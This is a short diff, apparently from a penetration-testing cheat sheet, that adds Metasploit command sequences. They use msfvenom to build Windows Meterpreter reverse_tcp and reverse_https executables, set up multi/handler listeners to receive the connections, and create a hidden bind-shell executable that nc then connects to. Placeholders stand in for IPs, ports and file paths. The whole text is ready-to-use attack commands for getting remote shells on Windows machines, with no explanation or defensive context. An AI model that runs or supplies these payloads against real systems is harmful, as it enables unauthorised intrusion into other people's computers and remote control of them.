@@ -48,3 +48,22 @@ set payload windows/meterpreter/bind_tcp
 set rhost {IP}
 set lport {port}
 exploit
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost={IP} lport={port} -f exe > {Path}
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost {IP}
+set lport {port}
+exploit
+
+msfvenom -p windows/meterpreter/reverse_https lhost={IP} lport=443 -f exe > {Path}
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost {IP}
+set lport 443
+exploit
+
+msfvenom -p windows/shell_hidden_bind_tcp ahost={IP} lport={port} -f exe > {Path}
+nc {IP} {port}
